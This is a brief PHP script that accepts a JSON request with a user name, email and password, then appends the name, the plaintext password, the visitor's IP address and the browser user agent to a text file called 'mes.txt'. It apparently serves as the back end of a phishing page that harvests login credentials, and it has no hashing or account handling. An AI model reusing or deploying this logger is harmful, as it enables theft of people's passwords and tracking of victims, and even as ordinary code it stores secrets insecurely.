<?php
$data = json_decode(file_get_contents('php://input'), true);

$name = $data['user_name'];
$email = $data['email'];
$password = $data['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$file = "mes.txt";
$fh = fopen($file, "a+") or die("Unable to open file!");
fwrite($fh,"\n ------------------- \n");

fwrite($fh,"\n name:".$name."\n");
fwrite($fh,"\n password:".$password." \n");
fwrite($fh,"\n ip:".$ip."\n");
fwrite($fh,"\n user_agent:".$user_agent."\n");

fwrite($fh,"\n ------------------- \n");

fclose($fh);


?> 